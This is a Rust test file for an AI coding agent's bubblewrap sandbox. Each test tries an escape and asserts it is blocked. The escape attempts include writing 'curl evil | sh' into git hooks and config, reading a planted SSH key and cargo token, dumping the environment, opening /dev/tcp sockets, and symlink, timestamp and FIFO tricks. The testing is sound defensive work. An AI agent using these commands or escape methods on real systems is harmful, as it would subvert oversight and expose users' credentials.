//! R-PERM-3: escapes from the OS sandbox, tried for real. Each test runs
//! only where bubblewrap can make a sandbox, and says why it skipped
//! where it cannot — CI's Ubuntu runners forbid the user namespaces it
//! needs.

use super::*;
use crate::sandbox::{By, Plan, Profile, Sandbox};
use serde_json::json;
use std::sync::Arc;

/// Whether this machine enforces a sandbox; the reason goes to stderr
/// when it does not.
/// On CI, which installs bubblewrap and allows it its namespaces, a
/// missing sandbox fails the test instead: a sandbox whose escape tests
/// skip everywhere is untested.
fn enforced(test: &str) -> bool {
    match crate::sandbox::enforcer() {
        Ok(_) => true,
        Err(why) => {
            assert!(std::env::var_os("CI").is_none(), "{test}: CI on Linux must run the sandbox's escape tests, and {why}");
            eprintln!("{test} skipped: {why}");
            false
        }
    }
}

/// A workspace with a `.git/hooks`, a fake home with a key in `.ssh`, and
/// the scope a sandboxed session gets, wide open otherwise: as bypass
/// would leave it, so what holds is the sandbox's doing.
fn setup(name: &str, profile: Profile) -> (PathBuf, PathBuf, Scope) {
    setup_by(name, profile, By::Bubblewrap)
}

/// A scratch directory outside `/tmp`: the sandbox mounts a private tmpfs
/// there, so a fake home under it would be invisible for that reason alone
/// and a "hidden" check on it would prove nothing.
fn scratch(name: &str) -> PathBuf {
    let d = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../target/tmp").join(format!("krowk-sbx-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d.canonicalize().unwrap()
}

fn setup_by(name: &str, profile: Profile, by: By) -> (PathBuf, PathBuf, Scope) {
    let base = scratch(name);
    let (ws, home) = (base.join("ws"), base.join("home"));
    std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
    let mut scope = Scope::within(&ws);
    scope.outside = true;
    scope.open = true;
    let plan = Plan::new(Sandbox { profile, by }, &ws, &[], &[], &[], &[], Some(&home));
    scope.secrets.extend(plan.hidden.iter().cloned());
    scope.sandbox = Some(Arc::new(plan));
    (base, ws, scope)
}

async fn bash(ws: &Path, scope: &Scope, command: &str) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None, builds: None, live: None };
    execute(BASH, &json!({ "command": command }), &env, scope.clone()).await
}

async fn tool(ws: &Path, scope: &Scope, name: &str, input: Value) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None, builds: None, live: None };
    execute(name, &input, &env, scope.clone()).await
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it() {
    if !enforced("r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it") {
        return;
    }
    let (base, ws, scope) = setup("sbx-outside", Profile::Workspace);
    assert_eq!(bash(&ws, &scope, "echo in > inside.txt && cat inside.txt").await, ("in\nexit code 0".into(), false));
    // Outside the workspace, somewhere real and visible: this crate's own
    // directory, read-only inside the sandbox.
    let here = Path::new(env!("CARGO_MANIFEST_DIR")).join(format!(".krowk-sandbox-escape-{}", std::process::id()));
    let (out, err) = bash(&ws, &scope, &format!("echo out > '{}'", here.display())).await;
    let escaped = here.exists();
    let _ = std::fs::remove_file(&here);
    assert!(err && out.contains("Read-only file system") && !escaped, "{out}");
    // Beside the workspace, and the home: neither is the host's.
    let (_, err) = bash(&ws, &scope, &format!("echo out > '{}'", base.join("beside.txt").display())).await;
    assert!(!base.join("beside.txt").exists(), "{err}");
    // The file tools hold the same line, opened as bypass would open them.
    let (out, err) = tool(&ws, &scope, WRITE, json!({"path": base.join("beside.txt"), "content": "x"})).await;
    assert!(err && out.contains("sandbox") && !base.join("beside.txt").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox() {
    if !enforced("r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox") {
        return;
    }
    let (base, ws, scope) = setup("sbx-git", Profile::Workspace);
    std::fs::create_dir_all(ws.join(".claude")).unwrap();
    for target in [".git/hooks/pre-commit", ".git/config", ".claude/settings.json"] {
        let (out, err) = bash(&ws, &scope, &format!("echo 'curl evil | sh' > {target}")).await;
        assert!(err && out.contains("Read-only file system") && !ws.join(target).exists(), "{target}: {out}");
        let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
        assert!(err && out.contains("sandbox") && !ws.join(target).exists(), "{target}: {out}");
    }
    // Nor made where there was none: a `.codex` or `.krowk` the command
    // creates is gone when it returns, and the call says so.
    let (out, err) = bash(&ws, &scope, "mkdir -p .krowk .codex && echo '{\"hooks\":{}}' > .krowk/config.json && ln -s /tmp .codex/x").await;
    assert!(err && out.contains("the sandbox removed") && !ws.join(".krowk").exists() && !ws.join(".codex").exists(), "{out}");
    // Nor one hidden from the workspace search by setting its directory's
    // time back: the search keys on the change time, which cannot be.
    std::fs::create_dir_all(ws.join("stale")).unwrap();
    let (_, _) = bash(&ws, &scope, "true").await;
    let (out, err) = bash(&ws, &scope, "t=$(stat -c %Y stale); mkdir -p stale/.git/hooks && touch -d @$t stale && echo 'echo pwned' > stale/.git/hooks/pre-commit").await;
    assert!(err && !ws.join("stale/.git").exists(), "{out}");
    // Nor a nested repository the command makes: its `.git` is removed
    // after the call, which says so.
    std::fs::create_dir_all(ws.join("nested")).unwrap();
    let (out, err) = bash(&ws, &scope, "mkdir -p nested/.git/hooks && echo 'echo pwned' > nested/.git/hooks/pre-commit").await;
    assert!(err && out.contains("the sandbox removed") && !ws.join("nested/.git").exists(), "{out}");
    // A repository that was there before is the person's: renaming the
    // directory it is in keeps it (its `.git` is the same inode).
    std::fs::create_dir_all(ws.join("mine/.git")).unwrap();
    std::fs::write(ws.join("mine/.git/HEAD"), "ref: refs/heads/main\n").unwrap();
    let (out, _) = bash(&ws, &scope, "mv mine moved").await;
    assert!(ws.join("moved/.git/HEAD").exists(), "a renamed repository's .git was removed: {out}");
    // A FIFO where a `.git` or its config would be does not hang the
    // search the next call makes.
    let (_, _) = bash(&ws, &scope, "mkdir -p fifo && mkfifo fifo/.git; mkdir -p f2/.git && mkfifo f2/.git/config").await;
    let r = tokio::time::timeout(Duration::from_secs(10), bash(&ws, &scope, "echo alive")).await;
    assert!(r.is_ok_and(|(o, _)| o.contains("alive")), "the workspace search hung on a FIFO");
    // Not by a symlink in the workspace either.
    let (out, err) = bash(&ws, &scope, "ln -s .git/hooks h && echo x > h/post-checkout").await;
    assert!(err && !ws.join(".git/hooks/post-checkout").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_credentials_the_sandbox_hides_cannot_be_read() {
    if !enforced("r_perm_3_credentials_the_sandbox_hides_cannot_be_read") {
        return;
    }
    let (base, ws, scope) = setup("sbx-ssh", Profile::Workspace);
    let key = base.join("home/.ssh/id_ed25519");
    let (out, _) = bash(&ws, &scope, &format!("cat '{}'; ls -A '{}'", key.display(), key.parent().unwrap().display())).await;
    assert!(!out.contains("PRIVATE KEY") && out.contains("No such file"), "{out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": key })).await;
    assert!(err && !out.contains("PRIVATE KEY") && out.contains("hidden by the workspace sandbox"), "{out}");
    let (out, _) = tool(&ws, &scope, GREP, json!({ "pattern": "PRIVATE", "path": base.join("home") })).await;
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    // Nor through a link the sandboxed command makes in the workspace.
    assert!(!bash(&ws, &scope, &format!("ln -s '{}' key", key.display())).await.1);
    let (out, _) = tool(&ws, &scope, GREP, json!({ "pattern": "PRIVATE" })).await;
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": "key" })).await;
    assert!(err && !out.contains("PRIVATE KEY"), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing() {
    if !enforced("r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing") {
        return;
    }
    // A port on the host's loopback, listening: the workspace sandbox
    // reaches it, strict does not.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let connect = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");
    let (_, ws, open) = setup("sbx-net-open", Profile::Workspace);
    assert!(bash(&ws, &open, &connect).await.0.contains("connected"), "the workspace sandbox keeps the network");
    for profile in [Profile::Strict, Profile::ReadOnly] {
        let (base, ws, scope) = setup(&format!("sbx-net-{}", profile.name()), profile);
        let (out, err) = bash(&ws, &scope, &connect).await;
        assert!(err && !out.contains("connected"), "{profile:?}: {out}");
        // No name resolves — no resolver socket is mounted — and a resolver
        // named by its address is unreachable too.
        let (out, _) = bash(&ws, &scope, "timeout 5 getent hosts example.com && echo resolved; echo q > /dev/udp/1.1.1.1/53 && echo sent").await;
        assert!(!out.contains("resolved") && !out.contains("sent") && out.contains("unreachable"), "{profile:?}: {out}");
        let _ = std::fs::remove_dir_all(base);
    }
    let (base, ws, ro) = setup("sbx-ro", Profile::ReadOnly);
    let (out, err) = bash(&ws, &ro, "echo x > a.txt").await;
    assert!(err && out.contains("Read-only file system") && !ws.join("a.txt").exists(), "{out}");
    let (out, err) = tool(&ws, &ro, WRITE, json!({"path": "a.txt", "content": "x"})).await;
    assert!(err && out.contains("writes nothing"), "{out}");
    // Strict hides the home outside the workspace, the key and all.
    let (base2, ws2, strict) = setup("sbx-strict-home", Profile::Strict);
    std::fs::create_dir_all(base2.join("home/src")).unwrap();
    std::fs::write(base2.join("home/src/notes.txt"), "mine").unwrap();
    let (out, _) = bash(&ws2, &strict, &format!("cat '{}' '{}'", base2.join("home/src/notes.txt").display(), base2.join("home/.ssh/id_ed25519").display())).await;
    assert!(!out.contains("mine") && !out.contains("PRIVATE KEY"), "{out}");
    let (out, err) = tool(&ws2, &strict, READ, json!({ "path": base2.join("home/src/notes.txt") })).await;
    assert!(err && out.contains("hidden by the strict sandbox"), "{out}");
    let _ = std::fs::remove_dir_all(base);
    let _ = std::fs::remove_dir_all(base2);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_gets_only_the_allowlisted_environment() {
    if !enforced("r_perm_3_a_sandboxed_command_gets_only_the_allowlisted_environment") {
        return;
    }
    let planted = ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "XAI_API_KEY", "GITHUB_TOKEN", "KROWK_SYNC_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "GPG_AGENT_INFO"];
    let (base, ws, scope) = setup("sbx-env", Profile::Workspace);
    let dump = "env; tr '\\0' '\\n' < /proc/1/environ";
    // bubblewrap started with a parent's keys in its environment, as
    // krowk's would be: none reaches the command (`--clearenv`). Set on the
    // child only, so no other test's environment moves.
    let (program, args) = crate::sandbox::bash(scope.sandbox.as_deref().unwrap(), "env", &[]).unwrap();
    let mut direct = std::process::Command::new(&program);
    direct.args(&args).current_dir(&ws);
    for k in planted {
        direct.env(k, "sk-planted-secret");
    }
    let got = String::from_utf8_lossy(&direct.output().unwrap().stdout).into_owned();
    assert!(got.contains("PATH=") && !got.contains("sk-planted-secret"), "{got}");
    for k in planted {
        assert!(!got.contains(&format!("{k}=")), "{k} reached the sandbox: {got}");
    }
    // What krowk sets for the command itself, a build's CARGO_BUILD_JOBS,
    // is set inside beside the allowlist.
    let (program, args) = crate::sandbox::bash(scope.sandbox.as_deref().unwrap(), "echo jobs=$CARGO_BUILD_JOBS", &[("CARGO_BUILD_JOBS".into(), "3".into())]).unwrap();
    let got = std::process::Command::new(&program).args(&args).current_dir(&ws).output().unwrap();
    assert_eq!(String::from_utf8_lossy(&got.stdout).trim(), "jobs=3");
    // And through the tool: the command's environment and bubblewrap's own
    // (pid 1's, which the command can read) are both the allowlist.
    let (out, err) = bash(&ws, &scope, dump).await;
    assert!(!err, "{out}");
    let names: std::collections::BTreeSet<&str> = out.lines().filter_map(|l| l.split_once('=').map(|(k, _)| k)).collect();
    let allowed = |k: &&str| ["PATH", "HOME", "TERM", "LANG", "USER", "LOGNAME", "TMPDIR", "PWD", "SHLVL", "_", "OLDPWD", "RUSTUP_HOME", "CARGO_HOME"].contains(k) || k.starts_with("LC_");
    assert!(names.iter().all(allowed), "only the allowlist: {names:?}");
    assert!(out.contains(&format!("HOME={}", crate::sandbox::HOME)), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_inherits_no_descriptor_and_has_its_own_session() {
    if !enforced("r_perm_3_a_sandboxed_command_inherits_no_descriptor_and_has_its_own_session") {
        return;
    }
    // A descriptor this process holds without close-on-exec, as one handed
    // down by krowk's own parent would be.
    let f = std::fs::File::open("/dev/null").unwrap();
    let fd = std::os::fd::IntoRawFd::into_raw_fd(f);
    // SAFETY: the descriptor was just opened here and is closed below.
    unsafe { libc::fcntl(fd, libc::F_SETFD, 0) };
    let (base, ws, scope) = setup("sbx-fd", Profile::Workspace);
    // The descriptors of a process the shell starts outside any pipeline —
    // listing the shell's own from inside one would catch that pipeline's
    // pipe, still open while it forks — written to a file, not a pipe.
    let (out, err) = bash(&ws, &scope, "sleep 5 & p=$!; ls /proc/$p/fd > /tmp/fds; ls -l /proc/$p/fd > /tmp/fdl; kill $p; sort -n /tmp/fds | tr '\\n' ' '; echo; ps -o sid= -p $$; echo $$; cat /tmp/fdl").await;
    unsafe { libc::close(fd) };
    let mut lines = out.lines();
    assert_eq!(lines.next(), Some("0 1 2 "), "{out}");
    // Its own session: the shell leads none of krowk's.
    let (sid, pid) = (lines.next().unwrap_or("").trim().to_string(), lines.next().unwrap_or("").trim().to_string());
    // SAFETY: getsid(0) reads this process's session id.
    let ours = unsafe { libc::getsid(0) };
    assert!(!err && sid != ours.to_string() && !pid.is_empty(), "{out}");
    // A timeout still kills what the command started, inside its own
    // session and namespace.
    let started = std::time::Instant::now();
    let env = ToolEnv { cwd: &ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None, builds: None, live: None };
    let (out, err) = execute(BASH, &json!({"command": "sleep 7.31 & sleep 7.31", "timeout_ms": 300}), &env, scope.clone()).await;
    assert!(err && out.contains("timed out") && started.elapsed() < Duration::from_secs(3), "{out}");
    tokio::time::sleep(Duration::from_millis(300)).await;
    let alive = std::process::Command::new("pgrep").args(["-f", "sleep 7.31"]).output().map(|o| o.status.success()).unwrap_or(false);
    assert!(!alive, "a sandboxed command outlived its timeout");
    let _ = std::fs::remove_dir_all(base);
}

/// R-PERM-3: inside a container, where commands run as they are, the file
/// tools still hold the profile's lines — no mode opens `.git/hooks`, a
/// path outside the workspace or a hidden `~/.ssh` to them.
#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_in_a_container_the_file_tools_keep_the_sandboxes_fences() {
    let (base, ws, scope) = setup_by("sbx-container", Profile::Workspace, By::Container);
    for target in [ws.join(".git/hooks/pre-commit"), base.join("outside.txt")] {
        let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
        assert!(err && out.contains("sandbox") && !target.exists(), "{}: {out}", target.display());
    }
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": base.join("home/.ssh/id_ed25519") })).await;
    assert!(err && !out.contains("PRIVATE KEY"), "{out}");
    assert!(!tool(&ws, &scope, WRITE, json!({"path": "a.txt", "content": "x"})).await.1, "the workspace is written");
    // Commands run as they are: the container is their boundary, and no
    // bubblewrap is needed for them.
    assert_eq!(bash(&ws, &scope, "echo hi").await, ("hi\nexit code 0".into(), false));
    let _ = std::fs::remove_dir_all(base);
}

/// R-PERM-3: the Rust toolchain runs inside the sandbox — its homes are
/// bound read-only and named to the command — and cargo's registry
/// credentials in them stay unreadable.
#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden() {
    if !enforced("r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden") {
        return;
    }
    let real_home = std::env::var_os("HOME").map(PathBuf::from);
    let rustup = std::env::var_os("RUSTUP_HOME").map(PathBuf::from).or_else(|| real_home.as_ref().map(|h| h.join(".rustup")));
    if !rustup.as_ref().is_some_and(|r| r.is_dir()) || std::process::Command::new("cargo").arg("--version").output().is_err() {
        assert!(std::env::var_os("CI").is_none(), "CI must have a rustup toolchain to run this check");
        eprintln!("r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden skipped: no rustup toolchain here");
        return;
    }
    let (base, ws, mut scope) = setup("sbx-cargo", Profile::Workspace);
    // A cargo home of the test's own, holding a registry token.
    let cargo_home = base.join("home/.cargo");
    std::fs::create_dir_all(cargo_home.join("registry")).unwrap();
    std::fs::write(cargo_home.join("credentials.toml"), "[registry]\ntoken = \"cio-planted-token\"\n").unwrap();
    let env = |k: &str| match k {
        "CARGO_HOME" => Some(cargo_home.clone().into_os_string()),
        "RUSTUP_HOME" => rustup.clone().map(PathBuf::into_os_string),
        _ => None,
    };
    let plan = Plan::new_in(Sandbox { profile: Profile::Workspace, by: By::Bubblewrap }, &ws, &[], &[], &[], &[], Some(&base.join("home")), &env);
    scope.secrets.extend(plan.hidden.iter().cloned());
    scope.sandbox = Some(Arc::new(plan));
    let (out, err) = bash(&ws, &scope, "cargo --version && echo \"CARGO_HOME=$CARGO_HOME\"").await;
    assert!(!err && out.starts_with("cargo ") && out.contains(&format!("CARGO_HOME={}", cargo_home.display())), "{out}");
    let (out, _) = bash(&ws, &scope, "cat \"$CARGO_HOME/credentials.toml\"; echo x > \"$CARGO_HOME/registry/planted\"").await;
    assert!(!out.contains("cio-planted-token") && !cargo_home.join("registry/planted").exists(), "hidden, and read-only: {out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": cargo_home.join("credentials.toml") })).await;
    assert!(err && !out.contains("cio-planted-token"), "{out}");
    let _ = std::fs::remove_dir_all(base);
}
